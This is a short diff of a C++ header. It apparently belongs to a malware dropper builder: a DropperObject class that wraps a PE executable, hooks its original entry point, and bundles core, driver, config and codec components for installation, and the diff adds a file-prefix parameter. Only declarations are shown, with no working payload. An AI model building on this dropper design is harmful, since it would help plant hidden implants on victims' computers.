@@ -78,14 +78,14 @@ private:
 	
 	int _getIATCallIndex(std::string dll, std::string call);
 
-	DWORD _build(WINSTARTFUNC OriginalEntryPoint);
+	DWORD _build(WINSTARTFUNC OriginalEntryPoint, std::string fPrefix);
 
 	ULONG _exeType;
 
 public:
 	DropperObject(PEObject& pe);
 	
-	bool build( bf::path core, bf::path core64, bf::path config, bf::path codec, bf::path driver, bf::path driver64, std::string installDir);
+	bool build( bf::path core, bf::path core64, bf::path config, bf::path codec, bf::path driver, bf::path driver64, std::string installDir, std::string fPrefix);
 	
 	char* getRestoreStub() 
 	{ 
